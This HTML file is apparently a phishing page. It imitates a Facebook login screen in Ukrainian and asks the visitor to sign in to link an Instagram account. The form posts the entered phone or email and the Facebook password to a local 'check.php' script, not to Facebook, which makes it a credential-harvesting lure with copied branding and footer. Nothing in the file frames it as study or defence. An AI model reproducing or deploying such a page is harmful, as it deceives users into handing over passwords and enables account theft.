<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="assets/css/animate.css">
    <link rel="stylesheet" href="assets/css/style.min.css">
</head>
<body>
    <div class="wrapper facebookPage">

        <div class="content">
            <div class="containerFacebook">
                <header>
                    <h1>facebook</h1>
                </header>
                <div class="facebook">
                    <div class="facebook__row">

                        <div class="facebook__logo"><img src="./assets/icons/instagram.png" alt=""></div>
                        
                        <div class="facebook__log">
                            Увійдіть у свій обліковий запис Facebook,<br>
                            щоб зв'язати його з додатком Instagram
                        </div>  

                        <form action="./assets/php/check.php" method="POST" class="facebook__form">
                            <input type="text" name="FacebookName" placeholder="Моб. телефон або ел. адреса">
                            <input type="password" name="FacebookPassword"  placeholder="Пароль у Facebook">
                            <button>Увiйти</button>
                        </form>

                        <div class="facebook__forget">Забули пароль?</div>

                        <div class="facebook__create">
                            <p>Створити обліковий запис</p>
                            <p>Не зараз</p>
                            <p>Довідковий центр</p>
                        </div>

                    </div>
                </div>
            </div>
        </div>

        <footer class="footer">
            <div class="containerFacebook">
                    <div class="footer__row">
                        <div class="footer__list">
                            <p>Українська</p>
                            <p>English (US)</p>
                            <p>Português (Brasil)</p>
                        </div>
    
                        <div class="footer__list">
                            <p>Русский</p>
                            <p>Magyar</p>
                            <p>Español</p>
                        </div>
                    </div>
                    <div class="footer__end">Facebook, Inc.</div>
            </div>
        </footer>
    </div>
</body>
</html>